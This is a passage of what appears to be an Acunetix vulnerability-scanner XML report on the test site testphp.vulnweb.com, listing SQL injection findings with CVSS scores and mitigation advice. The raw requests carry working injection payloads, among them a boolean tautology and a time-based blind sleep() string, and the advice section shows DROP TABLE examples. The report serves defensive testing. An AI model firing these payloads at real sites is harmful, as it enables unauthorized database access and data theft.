<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 86
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=g00dPa%24%24w0rD&amp;uname=-1'%20OR%203*2*1=6%20AND%2000038=00038%20or%20'LJ8DB3B7'=']]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:39 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Set-Cookie: login=test%2Ftest
Original-Content-Encoding: gzip
Content-Length: 5134
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="45" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">addcart</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/cart.php on line 82</font></pre>]]></Details>
       <Affects><![CDATA[/cart.php]]></Affects>
       <Parameter><![CDATA[addcart]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /cart.php HTTP/1.1
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

addcart=1'&quot;&amp;price=800]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:45 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5264
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="46" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">addcart</font></b> was set to <b><font color="dark">if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/</font></b><br/><br/>Tests performed: <ul><li>if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'&quot;XOR(if(now()=sysdate(),sleep(9),0))OR&quot;*/ =&gt; <b>9.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.328 s</b></li><li>if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; <b>6.328 s</b></li><li>if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'&quot;XOR(if(now()=sysdate(),sleep(3),0))OR&quot;*/ =&gt; <b>3.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.328 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.312 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.313 s</b></li><li>if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/ =&gt; <b>6.329 s</b></li><li>if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'&quot;XOR(if(now()=sysdate(),sleep(0),0))OR&quot;*/ =&gt; <b>0.328 s</b></li></ul><br/> Original value: <b>2</b>]]></Details>
       <Affects><![CDATA[/cart.php]]></Affects>
       <Parameter><![CDATA[addcart]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
